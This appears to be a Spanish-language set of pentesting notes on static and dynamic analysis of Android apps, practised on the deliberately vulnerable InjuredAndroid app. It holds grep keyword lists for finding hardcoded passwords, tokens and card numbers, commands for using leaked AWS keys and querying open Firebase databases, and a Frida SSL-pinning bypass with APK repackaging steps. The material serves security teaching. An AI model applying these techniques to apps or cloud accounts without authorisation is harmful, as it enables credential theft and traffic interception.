<br>Es excelente para trabajar con los recursos de una aplicación, como archivos de condiguración XML, imágenes y otros recursos empaquetados dentro de APK, así como particularmente útil cuando necesitamos modificar partes del APK que no son partes directamente el código fuente Java, como los recursos y configuraciones de la aplicación. Es usado comúnmente en la ingeniería inversa para personalizar aplicaciones y análisis de malware.
<br>De igual manera podríamos hacer uso de herramientas como dex2jar o smali2java para convertir los archivos smali a java.<br>
<br><a data-tooltip-position="top" aria-label="https://github.com/pxb1988/dex2jar" rel="noopener nofollow" class="external-link" href="https://github.com/pxb1988/dex2jar" target="_blank">dex2jar</a>: Es una herramienta que convierte archivos DEX (Contenidos en un APK) a archivos JAr. Este es un paso intermedio que puede ser útil en el proceso de conversión de Smali a Java. Una vez que tengamos el archivo JAR, podríamos hacer uso de un descompilador de java para obtener el código fuente.
<br>dex2jar {file.dex}
Copy<br>
<br><a data-tooltip-position="top" aria-label="https://github.com/AlexeySoshin/smali2java" rel="noopener nofollow" class="external-link" href="https://github.com/AlexeySoshin/smali2java" target="_blank">smali2java</a>: Herramienta específica para convertir código Smali a Java. Aunque no es perfecta y no siempre produce un código Java limpio y funcional, puede ser útil como un primer paso para la conversión.
<br>smali2java -path_to_smali={smali_directoriy}
Copy<br><br><br>El archivo AndroidManifest.xml es un componente esencial de cualquier aplicación Android. Define la estructura básica y las características de la aplicación. Este archivo se encuentra dentro del paquete APK (Android Package) y contiene información crucial que el sistema operativo Android necesita para ejecutar la aplicación correctamente.<br>Este describe los elementos fundamentales de la aplicación Android. Actúa como un contrato entre la aplicación y el sistema operativo Android, proporcionando información sobre la aplicación, sus componpentes y sus permisos necesarios.<br>Este archivo dispone de varias secciones claves:<br>Package information:<br>
<br>Define el nombre del paquete de la aplicación y la versión (package, versionCode y versionName).
<br>Application components:<br>
<br>Activity: Define las actividades (pantallas) de la aplicación. Cada actividad se declara con el elemento &lt;activity&gt;.
<br>Service: Declara los servicios que la aplicación utiliza. Los servicios son componentes que pueden ejecutarse en segundo plano.
<br>Broadcast Receiver: Declara los receptores de difusión, que permiten a la aplicación responder a mensajes del sistema o de otras aplicaciones.
<br>Content Provider: Declara los proveedores de contenido, que gestionan el acceso a un  conjunto estructurado de datos. Si los proveedores de contenido son exportados, esto podría suponer un gran riesgo dado que podría exponer datos a cualquier usuario o aplicación en el dispositivo.
<br>Permissions:<br>
<br>Específica los permisos que la aplicación necesita para funcionar correctamente, como el acceso a la red, ubicación, cámara, etc, usando el elemenot &lt;uses-permissions&gt;.
<br>Hardware and Software features:<br>
<br>Declara los requsiitos de hardware y software de la aplicación mediante elementos como &lt;user-feature&gt; y &lt;uses-sdk&gt;.
<br>Intents and Filters:<br>
<br>Define las intenciones (&lt;intent-filters&gt;) que permiten que la aplicación responda a diferentes tipos de acciones y datos. Los filtros de intenciones se utilizan dentro de componentes como actividades y receptores de difusión.
<br>Metadata:<br>
<br>Proporciona información adicional sobre la aplicación que puede ser utilizada por el sisetma o por otras aplicaciones mediante el elemento &lt;meta-data&gt;.
<br>Ejemplo básico de AndroidManifest.xml:<br>&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.myapp"
    android:versionCode="1"
    android:versionName="1.0"&gt;

    &lt;uses-permission android:name="android.permission.INTERNET" /&gt;
    &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;

    &lt;application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"&gt;
        
        &lt;activity android:name=".MainActivity"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.MAIN" /&gt;
                &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        
        &lt;service android:name=".MyService" /&gt;
        
        &lt;receiver android:name=".MyBroadcastReceiver"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.BOOT_COMPLETED" /&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
Copy<br>En este ejemplo podemos visualizar que:<br>
<br>La Raíz (&lt;manifest&gt;) define el paqeute y las versiones de la aplicación.
<br>Los Permisos (&lt;user-permission&gt;) decalra permisos para acceso a Internet y ubicación precisa.
<br>La Aplicación (&lt;application&gt;) contiene elementos como el icono, la etiqueta y el tema de la aplicación.
<br>La Actividad (&lt;activity&gt;) declara una actividad llamada MainActivity como un filtro de intención que la define como la actividad principal (launcher).
<br>El Servicio (&lt;service&gt;) declara un servicio llamado MyService.
<br>El Receptor de difusión (&lt;receiver&gt;) declara un receptor de difusión que responde a la acción BOOT_COMPLETED. 
<br>Sin el archivo AndroidManifest.xml, el sistema operativo Android no sabría qué componentes existen en la aplicación no cóomo interactuar con ellos, a su vez, garantiza que la aplicación solicitará los permisos necesarios para funcionar correctamente, manteniendo la seguridad y privacidad del usuario, así como también definirá cómo deberá ejectuarse la aplicación, incluyendo confiraciones de temas, filtros de intenciones y metadatos específicos. Además especificará las versiones de SDK (Software Development Kit) comptaibles y las características de hardware/software necesarias, asegurando que la aplicación se ejecute en dispositivos compatibles.<br><br><br>En el pentesting de aplicaciones móviles, las cadenas de texto comunes pueden sernos de gran ayuda para identificar vulnerabilidades y entender el comportamiento de la aplicación. Algunas veces podemos encontrar strings hardcodeadas en el recurso resources/strings.xml o también en el recurso xml.xml.<br><br>Buscar de manera recursiva en la estructura del APK por contraseñas y API keys con palabras claves como password, passwd, pwd, api_key, api_secret, token, auth_token, creds, credentials, etc.<br>
Para buscar tokens de sesión podríamos buscar palabras como session_id, sessión_token, etc.<br><br>Para buscar URLs de desarrollo y producción o URLs de Firebase : dev_url, prod_url, staging_url, base_url, dev_uri, firebase, etc.<br>
Para buscar Configuraciones de base de datos: db_user, db_pass, db_pwd, db_password, db_host, db_name, etc.<br><br>Para Certificados y Claves Criptográficas por palabras como certificate, private_key, public_key, ca_cert, pem, etc.<br>
Para Configuraciones de cifrado: encryption_key, cipher, crypto, etc.<br><br>Para Detalles de Usuario: username, email, user_id, phone, address, etc.<br>
Para Datos personales: ssn, dob, credit_card, cc_number, etc.<br><br>Para Mensajes de Error y Depuración: error_message, debug, log, exception, stack_trace, etc.<br>
Para Rutas de archivos y sistema: file_path, dir_path, tmp_path, temp_file, etc.<br><br>Para Endpoints de API: api_endpiont, api_url, api_uri, service_url, etc.<br>
Para Headers de Autenticación: Authorization, Bearer, Basic, etc.<br><br>Para Configuraciones de Proxy: proxy_host, proxy_port, proxy_user, proxy_pass, etc.<br>
Para Configuraciones de Red: network_config, ip_address, port, etc.<br><br>Para Configuraciones Generales: config, settings, preferences, etc.<br>
Para Opciones de Desarrollor: debug_mode, verbose, trace, etc.<br><br>Para OAuth y OpenID: oauth, openid, client_id, client_secret, redirect_uri, etc.<br>
Para Tokens JWT: jwt, jwt_token, jwt_secret, etc.<br><br>Para la búsqueda de posibles palabras claves sensibles podríamos hacer uso de palabras como secret, key, private. confidential. internal_use_only, etc.<br># Find for password or pwd or passwd or.... in recursive mode 
grep -rE "password|pwd|passwd|api|..." ./
# Find the string password in a strings of a file
strings {file} | grep "password"
# Find for IPv4 address using regex
grep -rE "((0-9){1,3}\.)(0-9){1,3}" ./
# Find for IPv6 address using regex
grep -rE "([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}" ./
# Find for URLs using regex
grep -rE "https?://[a-zA-Z0-9./?=_-]*" ./
# Find for EMAILS using regex
grep -rE "[a-zA-Z0-9_%+-]+@[a-z]+\.[a-zA-Z]{2,}" ./
# Find for credit card numbers using regex
grep -rE "([0-9]{4}[- ]?){3}[0-9]{4}" ./
# Find for MAC addresses using regex
grep -rE "([0-9a-zA-Z]{2}:){5}[0-9a-zA-Z]{2}" ./
Copy<br>Tener en cuenta ciertas funcionalidades de grep como las enumeradas abajo nos puede ayudar a personalizar mucho más nuestra búsqueda pudiendo visualizar conexto, líneas exactas del hallazgo, únicamente los archivos, etc:<br>
<br>-C {number}: Mostrara {numbers} líneas de contexto antes y después de las coincidencias.
<br>-n: Numerar las líneas en las que se encuentra las coincidencias.
<br>-i: Ignorar mayúscualas y minúsculas.
<br>-l: Mostrar solo nombes de archivos con las coincidencias.
<br><br><br>En el contexto de desarrollo de aplicaciones Android, una Activity es uno de los componentes más fundamentales. Representa una sola pantalla con una interfaz de usuario (UI) en una aplicación. Las actividades permiten a los usuarios interactuar con la aplicacióin, proporcionando una ventana a través de la cual se puede realizar acciones y ver información.<br>En Android, una exported activity es una actividad (Activity) qee está configurada para ser accesible por otras aplicaciones, además de la aplicación en la que está definida. Esto se controla mediante el atributo exported en el archivo AndroidManifest.xml. En este archivo, las actividades se defiene dentro de la etiqueta &lt;application&gt;. Cada actividad puede incluir el atributo android:exported, que puede tener los valores true o false.<br>
<br>
android:exported="true": La actividad es accesible por otras aplicaciones. Esto significa que otras aplicaciones pueden lanzar esta actividad utilizando un Intent.

<br>
android:exported="false": La actividad es privada a la aplicación y no puede ser lanzada por otras aplicaciones.

<br>
Ejemplo:

<br>En este caso estaremos utilizando el repositorio de <a data-tooltip-position="top" aria-label="https://github.com/B3nac/InjuredAndroid" rel="noopener nofollow" class="external-link" href="https://github.com/B3nac/InjuredAndroid" target="_blank">Android Injured</a> para poder practicar y llevar a cabo distintos tipos de vulnerabilidades, en este caso haremos uso de la segunda flag la cual abusa de una actividad exportada.<br>type AndroidManifest.xml | findstr /R "&lt;activity.*android:exported=\"true\""
Copy<br>Esto filtraría por aquellas actividades encontradas en el AndroidManifest.xml que esten exportadas, una vez localizada alguna de nuestro interes, para ejmplo práctico usaremos &lt;activity android:exported="true" android:name="b3nac.injuredandroid.b25lActivity"/&gt;, podríamos ejecutar esta actividad con el comando:<br># From a shell in our device start an activity from AM (Activity Manager)
adb shell am start b3nanc.injuredandroid/.b25lActivity
Copy<br>Con el ejemplo de la actividad b3nanc.injuredandroid.b25lActivity, es importante tener en cuenta que la sintaxís para ejecución de la actividad sería {package_name}/{activity_class}, en este caso, b3nanc.injuredandroid es el nombre del paquete de la aplicación, y .b25lActivity es el nombre de la actividad que se quiere iniciar. La barra (/) separa estos dos componentes.<br>Otros usos comunes del Activity Manager (am), son enviar un broadcast a todas las aplicaciones registradas para recibirlo, es decir la distribución de un mensaje a todos los componentes de aplicaciones que se han regristrado par recibir ese tipo específico de mensaje, así como también iniciar un servicio específico o detener el mismo.<br># Send a broadcast to all applications
am broadcast -a android.intent.action.BOOT_COMPLETED
# Start a service
am startservice -n com.example.myapp/.MyService
# Stop a service
am stopservice -n com.example.myapp/.MyService
Copy<br><br><br>Muchas veces en los buckets se suelen almacenar datos sensibles y configuraciones curcuales. Las aplicaciones móviles a menudo almacenan recursos como imágenes, videos y archivos de configuración en AWS S3, y si no están adecuadamente protegidos, pueden ser vulnerables a ataques como acceso no autorizado y filtraciones de datos. Explorar estas debilidades permite identifcar y obtener potenciales vías para la obtención de recursos sensibles que puedan ayudarnos en nuestro pentesting a aplicaciónes móviles.<br>Por lo mencionado, es más que interesante hacer búsqueda en archivos como AndroidManifest.xml u otros como propios archivos .java de strings hardcoded de AWS IDs y AWS Secrets en estos archivos, tanto el ID como el Secret son pedidos que nos realizara herramientas como aws para la configuración de un profile que nos permita comunicarnos con el bucket de Amazon.<br>Podemos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/initstring/cloud_enum" rel="noopener nofollow" class="external-link" href="https://github.com/initstring/cloud_enum" target="_blank">Cloud Enum</a> la cual realizaría enumeración de distintos tipos de servicios en la nube como recursos de Amazon (Buckets, WorkMail, WorkDocs, etc.) así como también recursos de Microsoft Azure (VMs, Hosted DBs, Storage Accounts, etc.) y plataformas de Google Cloud (GCP Buckets, Firebase Realtime DBs, etc.).<br># Download the tool
git clone https://github.com/initstring/cloud_enum
cd cloud_enum
# Install all dependencies
pip3 install -r requeriments.txt
# Execute the scanning 
python3 cloud_enum.py -k {dns}
Copy<br>A su vez, como mencionamos antes, con la herramienta aws se podrá realizar la configuración de perfiles (Basandonos en un AWS ID y AWS Secret) los cuales en caso de haber encontrado nos permitiría comunicarnos con, por ejemplo, un bucket previamente enumerado con la herramienta cloud_enum o mismo en caso de que la URL del Bucket también pueda haber sido localizada en alguna parte del código de nuestra herramienta.<br># Install aws command line interface
sudo apt-get install awscli
# Configure a profile with a specific name
aws profile configure --profile {profile_name}
Copy<br>Una vez ejecutado el comando anterior, se nos consultaran las configuraciones deseadas para el determinado perfile que estamos intentando crear, siendo estas cuatro, primero el WAS Access Key ID, luego el AWS Secret Access Key, posteriormente el region name y output format. Una vez realizada esta configuración se nos creara el perfil con estas configuraciones bajo el nombre especificado.<br>Una vez en este punto podríamos hacer consultas al Bucket S3 desde la terminal con este perfile configurado:<br># List a bucket contento using a specific profile 
aws s3 ls s3://{dns} --profile {profile_name}
Copy<br>Recurso: <a data-tooltip-position="top" aria-label="%5Bhttps://aws.amazon.com/cli/%5D(https://aws.amazon.com/cli/)" rel="noopener nofollow" class="external-link" href="https://dobliuw.com/[https://aws.amazon.com/cli/](https://aws.amazon.com/cli/)" target="_blank">AWS CLI Documentation</a><br><br><br>Firebase es una plataforma en la nube para el desarrollo de aplicaciones web y móviles. Una de las herramientas más destacadas y esenciales de Direbase son las bases de datos  en tiempo real (Realtime Database). Estas se alojan en la nube, son NoSQL y almacenan los datos como JSON.<br>
Que firebase permita alojar y disponer de los datos e información de la aplicación en tiempo real, mateniéndolos actualizados aunque el usuario no realice ninguna acción, significa que firebase envía automáticamente eventos a las aplicaciones cuando los datos cmabian, almacenando los datos nuevos en el disco. AUnque no hubiera conexión por parte de un usuario, sus datos estarían disponibles para el resto y los cambios realizados se sincronizarían una vez restablecida la conexión.<br>De igual manera que pasa con AWS Storage Buckets, pasa con Firebase, por lo que se vuelve más que interesante hacer búsquedas en código o archivos .xml en endpoints relacionados a las bases de datos de Firebase. Muchas veces, existen bases de datos enteras y endpoints específicos los cuales no contienen protección.<br>Existen herramientas como <a data-tooltip-position="top" aria-label="%5Bttps://github.com/Sambal0x/firebaseEnum%5D(https://github.com/Sambal0x/firebaseEnum)" rel="noopener nofollow" class="external-link" href="https://dobliuw.com/[ttps://github.com/Sambal0x/firebaseEnum](https://github.com/Sambal0x/firebaseEnum)" target="_blank">Firebase Enum</a> las cuales nos pueden permitir realizar reconocimiento de posibles endpoints en bases de datos de Firebase, de igual manera, puede ser que hayamos dado con una URL de una base de datos de Firebase junto con sirectorios y haciendo uso de curl o un navegador, podríamos dirgirnos a la misma.<br>curl -s -X GET https://{firebase_database_url}/{endpoints_paths}/.json
Copy<br><br><br><a data-tooltip-position="top" aria-label="https://github.com/MobSF/Mobile-Security-Framework-MobSF" rel="noopener nofollow" class="external-link" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank">MobSF</a> es una herramienta que se puede encontrar en github la cual nos permite realizar este proceso de análisis estatico (Así también como el de <a data-href="Android Mobile App Dynamic Analysis" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/2.-dynamic-analysis/android-mobile-app-dynamic-analysis.html" class="internal-link" target="_self" rel="noopener nofollow">Android Mobile App Dynamic Analysis</a> ) de manera automatizada y con una GUI la cual nos brinda herramientas y secciones muy poderosas e interesantes. Esta herramienta puede ser utilizada para la búsqueda de posibles actividades sospechosas en posibles APK que son malware.<br>MobSF trae consigo la posibilidad de generar un reporte técnico de manera automatica, para lo cual necesitaremos de <a data-tooltip-position="top" aria-label="https://wkhtmltopdf.org/downloads.html" rel="noopener nofollow" class="external-link" href="https://wkhtmltopdf.org/downloads.html" target="_blank">wkhtmltopdf</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/1.-static-analysis/android-mobile-app-static-analysis.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Mobile Applications/Android/1. Static Analysis/Android Mobile App Static Analysis.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 27 May 2024 14:57:46 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/jadx_gui_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/jadx_gui_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Dynamic Analysis]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:direct" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#direct</a> 
 <br><br>Como vimos en el apartado de <a data-href="Mobile Application Penetration Testing Process" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/mobile-application-penetration-testing-process.html" class="internal-link" target="_self" rel="noopener nofollow">Mobile Application Penetration Testing Process</a>, el análizis dinámico consiste en analizar la aplicación ejecutando la misma, interactuando con sus funcionalidades para poder entender que hace, cuando, como, etc.<br><br><br>SSL Pinning es una metodología de seguridad utilizada para asegurar que el tráfico de la aplicación no esta siendo interceptado (MITM) asegurando que la aplicación solo se comunique con un servidor específico mediante certificados SSL conocidos. Al implementar SSL Pinning, la aplicación almacena de manera interna uno o más certificados de los servidores confiables y los compara con los certificados recibidos durante la conexión SSL/TLS. Si no coincide, la conexión se rechaza, mitigando el riesgo de interceptación y manipulación de datos por parte de atacantes que intentan usar certificados falsificados o comprometidos.<br>Ejemplo de implementación de SSL Pinning en Android haciendo uso de OkHttp:<br>OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(new CertificatePinner.Builder()
        .add("{yourdomain.com}", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
        .build())
    .build();
Copy<br>Como pentesters, conocer este método de seguridad nos es fundamental para saber a que problema nos estamos pudiendo enfrentar en caso de tener erorres así como a su vez, intentar sortear el msimo.<br>En muchos casos, podríamos intentar evadir o seactivar el SSL Pinning para poder así analizar el tráfico de la aplicación. Esto puede inlcuir téncicas como por ejemplo:<br>
<br>Repackage the App: Modificar el código de la aplicación para eliminar o deshabilitar el pinning.
<br>Dynamic Instrumentation: Usar herramientas como Frida o Xposed para interceptar y modificar funciones en tiempo de ejecución.
<br>Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        // Skip SSL Pinning
        console.log("Bypassing SSL Pinning");
    };
});
Copy<br>
<br>MITM Proxies: Hacer uso de proxies especializados como <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> con plugins específicos que pueden deshabilitar el pinning en tiempo real.
<br><br><br>Una vez más, como se menciono en la sección de <a data-href="Android Mobile App Static Analysis" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/1.-static-analysis/android-mobile-app-static-analysis.html" class="internal-link" target="_self" rel="noopener nofollow">Android Mobile App Static Analysis</a>, podemos hacer uso de la herramient <a data-tooltip-position="top" aria-label="https://github.com/MobSF/Mobile-Security-Framework-MobSF" rel="noopener nofollow" class="external-link" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank">MobSF</a> la cual nos permite configurar y llevara a cabo de manera automatizada el análisis dinámico de una App. Para esto deberemos realizar alguans configuraciones las cuales están detalladas en esta <a data-tooltip-position="top" aria-label="https://mobsf.github.io/docs/#/dynamic_analyzer?id=genymotion-android" rel="noopener nofollow" class="external-link" href="https://mobsf.github.io/docs/#/dynamic_analyzer?id=genymotion-android" target="_blank">guií de configuración de análisis dinámico en MobSF</a>. <br><br><br>Burpsuite sin duda será una herramienta la cual utilizaremos también en este tipo de pentesting a aplicaicones móviles, configuraremos un nuevo proxy abierto a todas las interfaces, descargaremos el certificado, lo subiremos e instalaremos en el apartado de Security del telefono móvil y posteriormente configuraremos el Android Studio con el proxy creado.<br>
<br>Crear el proxy en <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a>:
<br><img alt="creating_a_new_proxy_burpsuite.png" src="https://dobliuw.com/lib/media/creating_a_new_proxy_burpsuite.png"><br>
<br>Una vez creado el proxy, la siguiente opción sería la de Import / export CA certificate, donde presionaremos la opción de exportar certificado en formato DER (Certificate in DER format) en el apartado de Export:
<br><img alt="export_certificate_bupsuite.png" src="https://dobliuw.com/lib/media/export_certificate_bupsuite.png"><br>
<br>Una vez descargado el mismo, nos debemos asegurar en cambiar la extensión a .cer, una vez guardado, simplemente arrastramos con el mouse el certificado al emulador para subirlo al dispositivo. En caso de tener un dispositivo real conectado o desear hacerlo desde línea de comandos, podemos hacerlo con herramientas como adb:
<br>&gt; adb push C:\Path\To\Downloaded\Certificate.cer /sdcard/
Copy<br>Para que esto funcione, además de lo mencionado en <a data-href="Android Lab configs and tips#Enabling Developer Options" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/0.-lab-setup/android-lab-configs-and-tips.html#Enabling_Developer_Options" class="internal-link" target="_self" rel="noopener nofollow">Android Lab configs and tips &gt; Enabling Developer Options</a>, deberíamos subir/mover el certificado (Archivo .cer) a un directorio accesible por el usuario, en este caso /sdcard/ es uno, pero podría ser /sdcard/Documents,/sdcard/Downloads, etc.<br>
<br>Tras la subida del certificado al dispositivo, estamos con la posibilidad de hacer uso de este para que las conexiones SSL con <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> sean posibles. Según el modelo de dispositivo el camino para instalar certificados suele cambiar pero de igual manera suele ser bastante similar al que se demuestra  como ejemplo, ir a Security &gt; Encryption &amp; credentials &gt; Install a certificate &gt; CA certificate
<br><img alt="encription_and_credentials_android.png" src="https://dobliuw.com/lib/media/encription_and_credentials_android.png" style="width: 150px; max-width: 100%;"> <img alt="install_a_certificate_android.png" src="https://dobliuw.com/lib/media/install_a_certificate_android.png" style="width: 157px; max-width: 100%;"> <img alt="ca_certificate_android.png" src="https://dobliuw.com/lib/media/ca_certificate_android.png" style="width: 150px; max-width: 100%;"> <img alt="sdcard_directory_from_import_cert_android.png" src="https://dobliuw.com/lib/media/sdcard_directory_from_import_cert_android.png" style="width: 150px; max-width: 100%;"> <br>
<br>Una vez subido e instalado el certificado en el dispositivo móvil, simplemente faltaría realizar la configuración, en este caso, en nuestra aplicación Android Studio:
<br><img alt="android_studio_burpsuite_settings.png" src="https://dobliuw.com/lib/media/android_studio_burpsuite_settings.png"><br>Para otros sistemas operativos, como macOS, podríamos hacer uso de otras opciones ante Burpsuite, como por ejemplo <a data-tooltip-position="top" aria-label="https://docs.proxyman.io/" rel="noopener nofollow" class="external-link" href="https://docs.proxyman.io/" target="_blank">Proxyman</a>. <br><br><br>Frida es una herramienta poderosa para la ingeniería inversa y la seguridad de aplicaicones que permite la inyección de scripts en aplicaciones en tiempo real. Es utilizaada princiaplmente por pentesters y desarrolladores de seugridad para realizar pruebas dinámicas y análisis en aplicaciones móviles y de escritorio. Permite inyectar scripts JavaScript en tiempo real para modificar el comportamiento de una app, inteceptar funciones y analizar datos.<br><br><br>Objection es una herramienta que aprovecha Frida para realizar diversas tareas de análisis y manipulación de aplicaciones móviles sin necesidad de acceso al código fuente o recompilación. Es una herramienta que automatiza el proceso e incluye una variedad de comandos para realizar tareas comunes de pentesting como SSL Pinning Bypass, manipulación de preferencias de aplicaciones, intercepción de tráfico de red y más.<br>
<br>Installation: 
<br># Install frida tools
pip3 install frida-tools
# Install objection
pip3 install objection
Copy<br>Una vez ejecutado los anteriores comandos ya tendríamos tanto la herramienta frida como objection disponibles para hacer uso desde línea de comandos, lo que nos permitiría intentar inyectar código para integrar Frida de manera automatica:<br>objection patchapk --source C:\Path\To\Application.apk
# Can't decode resource issue
objection patchapk --source C:\Path\To\Application.apk --use-aapt2
Copy<br>Tras la ejecución de este comando estaremos intentando descompilar el APK, posteriormente inyectar el código necesario para integrar Frida en la aplicación (Generalmente añadiendo la biblioteca Frida y modificando el código para cargar Frida al inico de la aplicación), para finalmente recompilar el APK y firmar el mismo, ya que la firma origianl del desarrollador pasa a no ser válida tras la recompilación, se utiliza una clave de firma de depuración proporcionada por Objection o una personalizada si se especifica, pero esto puede traer problemas por lo que nos puede llegar a ser de sumo interes poder realizar este proceso de manera manual.<br><br>Como hemos visto anteriormente, con la herramienta apktool podemos decompilar nuestro apk.<br>apktool d -r /path/to/application.apk
Copy<br>Una vez hecho esto, basandonos en la guía de instalación de <a data-tooltip-position="top" aria-label="https://koz.io/using-frida-on-android-without-root/" rel="noopener nofollow" class="external-link" href="https://koz.io/using-frida-on-android-without-root/" target="_blank">"Using frida on Android without root"</a>, ejecutaremos la siguiente suseción de comandos para proseguir con la instalación:<br># Download the frida gadget needed (In this examplel x86_64 architecture)
wget https://github.com/frida/frida/releases/download/16.2.5/frida-gadget-16.2.5-android-x86_64.so.xz
# Extract the compressed file
unxz frida-gadget-16.2.5-android-x86_64.so.xz
# Rename .so file to handle future errors
mv frida-gadget-16.2.5-android-x86_64.so libfrida-gadget.so
# Copy the .so file to needed lib directory (Becarefull with the architecture)
cp frida-gadget.so {decompiled_dir}/lib/{arquitecture_needed(e.g. x86_64)}/libfrida-gadget.so
Copy<br>Posteriormente deberemos agregar las líneas:<br>const-string v0, "frida-gadget"<br>
invoke-static {v0}, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V<br>Al <a href="https://dobliuw.com?query=tag:direct" class="tag" target="_blank" rel="noopener nofollow">#direct</a> method con el nombre constructor antes del return-void en el archivo {decompiled_dir}/smali/{name (e.g. b3nac)}/{appname (e.g. injuredAndroid)}/MainActivity.smali. Una vez habiendo agregado la libreria Frida para la arquitectura necesaria y habiendo modifcado el código para la llamada del mismo, simplemente faltaría volver a crear el archivo .apk:<br>apktool b {decomiled_dir} -o {new_builded_app}.apk
Copy<br>IMPORTANTE: Si no tenemos acceso a internet en la APP, será necesario agregar este permiso para que Frida gadget pueda abrir un socket y funcionar correctamente.<br>Una vez re-empaquetada la aplicación, necesitamos firmar el apk, para esto haremos uso de keytool y jarsigner.<br>
<br>Crear nuestras claves:
<br>keytool -genkey -v -keystore {custom}.keystore -alias {mykeyaliasname} -keyalg RSA -keysize 2048 -validity 10000 
Copy<br>
<br>Firmar el archivo .apk:
<br>jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore {custom}.keystore -storepass {password_used} {repackaged.apk} {mykeyaliasname}
Copy<br>
<br>Verificar la firma:
<br>jarsigner -verify {repackaged.apk}
Copy<br>
<br>Reempaquetar la aplicación
<br>zipalign 4 {repackaged.apk} {repackaged-final.apk}
Copy<br>Tras haber firmado y rempaquetado el APK, quedaría subir el apk e instalar el mismo al dispositivo móvil como se puede visualizar en <a data-href="Android Mobile App Static Analysis#Pushing an APK from our System" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/mobile-applications/android/1.-static-analysis/android-mobile-app-static-analysis.html#Pushing_an_APK_from_our_System" class="internal-link" target="_self" rel="noopener nofollow">Android Mobile App Static Analysis &gt; Pushing an APK from our System</a>. Una vez subida la aplicación e instalada en el dispositivo móvil, tras abrirla puede que veamos como si esta no cargará y se quedara en blanco, lo que indicaría probablemente de que logramos ejecutar exitosamente Frida, por lo que en un línea de comandos podríamos ejecutar el siguiente comando:<br>objection explore
Copy<br>Y en caso de haber funcionado veremos la respuesta del agante inyectado y que este responde ok, por lo que podríamos comenzar a ejecutar comandos como android sslpinning disable para deshabilitar el SSL Pinning y poder comenzar a ver el tráfico sin problema.<br><br><br>Como pentesters, revisar el Logcat es curcial dado que puede revelar una gran cantidad de información sobre la aplicación y su comportamiento en tiempo de ejecución, como por ejemplo:<br>
<br>Sensitive Infromation: El Logcat puede ocntener información sensible como claves API, tokens de sesión, credenciales, etc.
<br>Errors and Vulnerabilities: Podemos encontrarnos con exceptciones, fallos o errores que indiquen vulnerabilidades en la aplicación.
<br>Data Flow: Ayuda a entender el flujo de datos dentro de la apclicación, idenficiando puntos de entrada y salida de datos sensibles.
<br>Anomalous Behavior: Puede mostrar comportamientos anómalos o no intencionados que podrían ser explotados.
<br>Debugging and Analysis: Facilita la depuración y el análisis de la aplicación, permitiéndote identificar y entender posibles vectores de ataque.
<br><img alt="logcat_androidstudio_example.png" src="https://dobliuw.com/lib/media/logcat_androidstudio_example.png"><br>Para iniciar la captura de los logs o guardar los mismos, podemos hacer uso del comando:<br># Start capturing logs
adb logcat
# Save the logs
adb logcat &gt; /path/to/output_file.txt
Copy<br><br><br>Adicionalmente, en la página de <a data-tooltip-position="top" aria-label="https://codeshare.frida.re/" rel="noopener nofollow" class="external-link" href="https://codeshare.frida.re/" target="_blank">Frida Codeshare</a> podemos encontrar scripts creados por la comunidad para realizar distintas acciones, podemos descargarnos estos scripts. Para utilizar estos scripts podríamos hacer uso del comando:<br># Execute javascript script in the beginning
objection explore --startup-script {script_downloaded.js}
# Execute objection commands in the beginning
objection explore -s "android root disable"
